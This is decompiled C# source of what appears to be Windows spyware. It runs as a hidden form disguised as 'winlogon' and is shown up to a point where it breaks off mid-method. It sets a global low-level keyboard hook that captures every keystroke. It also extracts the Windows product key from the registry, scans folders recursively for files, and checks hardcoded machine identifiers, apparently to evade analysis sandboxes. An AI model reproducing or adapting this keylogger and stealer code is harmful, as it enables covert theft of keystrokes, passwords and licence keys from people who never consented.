using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace winlogon;

[DesignerGenerated]
public class Chromer : Form
{
	public sealed class GClass2
	{
		private struct Struct1
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		private delegate int Delegate5(int int_0, int int_1, ref Struct1 struct1_0);

		public delegate void GDelegate0(Keys keys_0);

		public delegate void GDelegate1(Keys keys_0);

		private static GDelegate0 gdelegate0_0;

		private static GDelegate1 gdelegate1_0;

		private static int int_0;

		private static Delegate5 delegate5_0;

		public GClass2()
		{
			delegate5_0 = smethod_4;
			int_0 = SetWindowsHookExA(13, delegate5_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int int_1, Delegate5 delegate5_1, int int_2, int int_3);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int int_1, int int_2, int int_3, Struct1 struct1_0);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int int_1);

		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		public static void smethod_0(GDelegate0 gdelegate0_1)
		{
			gdelegate0_0 = (GDelegate0)Delegate.Combine(gdelegate0_0, gdelegate0_1);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		public static void smethod_1(GDelegate0 gdelegate0_1)
		{
			gdelegate0_0 = (GDelegate0)Delegate.Remove(gdelegate0_0, gdelegate0_1);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		public static void smethod_2(GDelegate1 gdelegate1_1)
		{
			gdelegate1_0 = (GDelegate1)Delegate.Combine(gdelegate1_0, gdelegate1_1);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		public static void smethod_3(GDelegate1 gdelegate1_1)
		{
			gdelegate1_0 = (GDelegate1)Delegate.Remove(gdelegate1_0, gdelegate1_1);
		}

		private static int smethod_4(int int_1, int int_2, ref Struct1 struct1_0)
		{
			if (int_1 == 0)
			{
				switch (int_2)
				{
				case 256:
				case 260:
					gdelegate0_0?.Invoke((Keys)struct1_0.int_0);
					break;
				case 257:
				case 261:
					gdelegate1_0?.Invoke((Keys)struct1_0.int_0);
					break;
				}
			}
			return CallNextHookEx(int_0, int_1, int_2, struct1_0);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(int_0);
			base.Finalize();
		}
	}

	public enum GEnum1
	{

	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GStruct0
	{
		public int int_0;

		public GEnum1 genum1_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	private struct Struct2
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public IntPtr intptr_2;

		public IntPtr intptr_3;

		public FILETIME filetime_0;

		public IntPtr intptr_4;

		public IntPtr intptr_5;

		public IntPtr intptr_6;

		public IntPtr intptr_7;

		public IntPtr intptr_8;

		public IntPtr intptr_9;

		public IntPtr intptr_10;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GStruct1
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	private struct Struct3
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox richTextBox_0;

	[AccessedThroughProperty("RichTextBox2")]
	private RichTextBox richTextBox_1;

	[AccessedThroughProperty("RichTextBox3")]
	private RichTextBox richTextBox_2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox textBox_2;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("TextBox4")]
	private TextBox textBox_3;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("TextBox5")]
	private TextBox textBox_4;

	[AccessedThroughProperty("TextBox6")]
	private TextBox textBox_5;

	private string[] string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private List<string> list_0;

	[AccessedThroughProperty("kbHook")]
	private GClass2 gclass2_0;

	private string string_23;

	private object object_0;

	private string string_24;

	private string string_25;

	private RegistryKey registryKey_0;

	private object object_1;

	private string string_26;

	private string string_27;

	private string string_28;

	public Chromer()
	{
		((Form)this).add_Load((EventHandler)Chromer_Load);
		list_0 = new List<string>();
		vmethod_25(new GClass2());
		string_23 = null;
		string_25 = "SELECT * FROM Win32_VideoController";
		registryKey_0 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
		object_1 = RuntimeHelpers.GetObjectValue(registryKey_0.GetValue("ProductId"));
		string_26 = "76487-337-8429955-22614";
		string_27 = string.Empty;
		string_28 = string.Empty;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new RichTextBox());
		vmethod_3(new RichTextBox());
		vmethod_5(new RichTextBox());
		vmethod_7(new TextBox());
		vmethod_9(new TextBox());
		vmethod_11(new TextBox());
		vmethod_13(new Timer(icontainer_0));
		vmethod_15(new Label());
		vmethod_17(new TextBox());
		vmethod_19(new Timer(icontainer_0));
		vmethod_21(new TextBox());
		vmethod_23(new TextBox());
		((Control)this).SuspendLayout();
		RichTextBox obj = vmethod_0();
		Point location = new Point(0, 173);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("RichTextBox1");
		RichTextBox obj2 = vmethod_0();
		Size size = new Size(296, 170);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_0().set_Text(string.Empty);
		((Control)vmethod_0()).set_Visible(false);
		RichTextBox obj3 = vmethod_2();
		location = new Point(0, 349);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("RichTextBox2");
		RichTextBox obj4 = vmethod_2();
		size = new Size(296, 170);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		vmethod_2().set_Text(string.Empty);
		((Control)vmethod_2()).set_Visible(false);
		RichTextBox obj5 = vmethod_4();
		location = new Point(302, 173);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("RichTextBox3");
		RichTextBox obj6 = vmethod_4();
		size = new Size(296, 170);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(2);
		vmethod_4().set_Text(string.Empty);
		((Control)vmethod_4()).set_Visible(false);
		TextBox obj7 = vmethod_6();
		location = new Point(302, 349);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("TextBox1");
		TextBox obj8 = vmethod_6();
		size = new Size(100, 20);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		((Control)vmethod_6()).set_Visible(false);
		TextBox obj9 = vmethod_8();
		location = new Point(302, 375);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("TextBox2");
		TextBox obj10 = vmethod_8();
		size = new Size(100, 20);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		((Control)vmethod_8()).set_Visible(false);
		TextBox obj11 = vmethod_10();
		location = new Point(302, 401);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("TextBox3");
		TextBox obj12 = vmethod_10();
		size = new Size(100, 20);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		((Control)vmethod_10()).set_Visible(false);
		vmethod_14().set_AutoSize(true);
		Label obj13 = vmethod_14();
		location = new Point(302, 450);
		((Control)obj13).set_Location(location);
		((Control)vmethod_14()).set_Name("Label1");
		Label obj14 = vmethod_14();
		size = new Size(39, 13);
		((Control)obj14).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(6);
		vmethod_14().set_Text("Label1");
		((Control)vmethod_14()).set_Visible(false);
		TextBox obj15 = vmethod_16();
		location = new Point(302, 427);
		((Control)obj15).set_Location(location);
		((Control)vmethod_16()).set_Name("TextBox4");
		TextBox obj16 = vmethod_16();
		size = new Size(100, 20);
		((Control)obj16).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(7);
		((Control)vmethod_16()).set_Visible(false);
		vmethod_18().set_Enabled(true);
		TextBox obj17 = vmethod_20();
		location = new Point(302, 466);
		((Control)obj17).set_Location(location);
		((Control)vmethod_20()).set_Name("TextBox5");
		TextBox obj18 = vmethod_20();
		size = new Size(100, 20);
		((Control)obj18).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(8);
		((Control)vmethod_20()).set_Visible(false);
		((TextBoxBase)vmethod_22()).set_BorderStyle((BorderStyle)1);
		((Control)vmethod_22()).set_Dock((DockStyle)1);
		TextBox obj19 = vmethod_22();
		location = new Point(0, 0);
		((Control)obj19).set_Location(location);
		vmethod_22().set_Multiline(true);
		((Control)vmethod_22()).set_Name("TextBox6");
		TextBox obj20 = vmethod_22();
		size = new Size(603, 167);
		((Control)obj20).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(10);
		((Control)vmethod_22()).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(603, 526);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_KeyPreview(true);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Chromer");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("winlogon");
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_0()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(RichTextBox richTextBox_3)
	{
		richTextBox_0 = richTextBox_3;
	}

	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_2()
	{
		return richTextBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(RichTextBox richTextBox_3)
	{
		richTextBox_1 = richTextBox_3;
	}

	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_4()
	{
		return richTextBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(RichTextBox richTextBox_3)
	{
		richTextBox_2 = richTextBox_3;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_6()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(TextBox textBox_6)
	{
		textBox_0 = textBox_6;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_8()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_9(TextBox textBox_6)
	{
		textBox_1 = textBox_6;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_10()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_11(TextBox textBox_6)
	{
		textBox_2 = textBox_6;
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_12()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_13(Timer timer_2)
	{
		EventHandler eventHandler = method_3;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual Label vmethod_14()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_15(Label label_1)
	{
		label_0 = label_1;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_16()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_17(TextBox textBox_6)
	{
		textBox_3 = textBox_6;
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_18()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_19(Timer timer_2)
	{
		EventHandler eventHandler = method_4;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_20()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_21(TextBox textBox_6)
	{
		textBox_4 = textBox_6;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_22()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_23(TextBox textBox_6)
	{
		textBox_5 = textBox_6;
	}

	public string GetProductKey(string KeyPath, string ValueName)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue(KeyPath, ValueName, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = string.Empty;
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = string.Empty;
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = string.Empty;
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	public void Search(string folder, string filter, bool all = true)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		FileInfo[] files = directoryInfo.GetFiles(filter);
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				list_0.Add(fileInfo.FullName);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (!all)
		{
			return;
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			try
			{
				Search(directoryInfo2.FullName, filter);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Invalid comparison between Unknown and I4
		//IL_0897: Unknown result type (might be due to invalid IL or missing references)
		//IL_089d: Invalid comparison between Unknown and I4
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_091e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Invalid comparison between Unknown and I4
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0951: Invalid comparison between Unknown and I4
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097b: Invalid comparison between Unknown and I4
		//IL_09a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a5: Invalid comparison between Unknown and I4
		//IL_09cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Invalid comparison between Unknown and I4
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a23: Invalid comparison between Unknown and I4
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Invalid comparison between Unknown and I4
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Invalid comparison between Unknown and I4
		//IL_0a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Invalid comparison between Unknown and I4
		//IL_0ac8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acb: Invalid comparison between Unknown and I4
		//IL_0af2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Invalid comparison between Unknown and I4
		//IL_0b70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Invalid comparison between Unknown and I4
		//IL_0b9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Invalid comparison between Unknown and I4
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Invalid comparison between Unknown and I4
		//IL_0bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf0: Invalid comparison between Unknown and I4
		//IL_0c17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c1a: Invalid comparison between Unknown and I4
		//IL_0c41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c44: Invalid comparison between Unknown and I4
		//IL_0c6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6e: Invalid comparison between Unknown and I4
		//IL_0c95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c98: Invalid comparison between Unknown and I4
		//IL_0cbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc2: Invalid comparison between Unknown and I4
		//IL_0ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cec: Invalid comparison between Unknown and I4
		//IL_0d13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d16: Invalid comparison between Unknown and I4
		//IL_0d3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d40: Invalid comparison between Unknown and I4
		//IL_0d67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d6a: Invalid comparison between Unknown and I4
		//IL_0d91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d94: Invalid comparison between Unknown and I4
		//IL_0dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbe: Invalid comparison between Unknown and I4
		//IL_0de5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de8: Invalid comparison between Unknown and I4
		//IL_0e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3c: Invalid comparison between Unknown and I4
		//IL_0e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e66: Invalid comparison between Unknown and I4
		//IL_0e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e90: Invalid comparison between Unknown and I4
		//IL_0eb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eba: Invalid comparison between Unknown and I4
		//IL_0ee1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ee4: Invalid comparison between Unknown and I4
		//IL_0f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0e: Invalid comparison between Unknown and I4
		//IL_0f35: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f38: Invalid comparison between Unknown and I4
		//IL_0f5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f62: Invalid comparison between Unknown and I4
		//IL_0f89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f8c: Invalid comparison between Unknown and I4
		//IL_0fb3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb6: Invalid comparison between Unknown and I4
		//IL_0fdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe0: Invalid comparison between Unknown and I4
		//IL_1007: Unknown result type (might be due to invalid IL or missing references)
		//IL_100a: Invalid comparison between Unknown and I4
		//IL_1031: Unknown result type (might be due to invalid IL or missing references)
		//IL_1034: Invalid comparison between Unknown and I4
		//IL_105b: Unknown result type (might be due to invalid IL or missing references)
